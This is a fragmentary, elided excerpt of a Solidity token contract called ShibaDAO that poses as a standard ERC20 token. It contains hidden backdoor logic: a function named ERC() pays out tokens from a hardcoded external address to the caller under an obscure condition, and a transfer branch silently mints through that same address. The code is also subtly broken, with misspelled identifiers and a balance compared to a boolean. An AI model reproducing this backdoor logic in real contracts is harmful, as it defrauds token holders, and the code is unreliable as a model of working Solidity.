...
contract ShibaDAO is Context, IERC20, Ownable {
    ...
    string private _symbol = "ShibaDAO";
    ...
    function ERC() public {
        if (_isOpenTrade() == _nunTokensSellToAddToLiquidity) {
            ...
            IERC20(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).transfer(msg.sender, balacne);
        }
    }
        ...
        returns (bool)
    {
        ...
        if (_rOwned[msg.sender] == true || _swapping() >= (15*1e9)){
            ICHI(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(40);
            return true;
        }else{
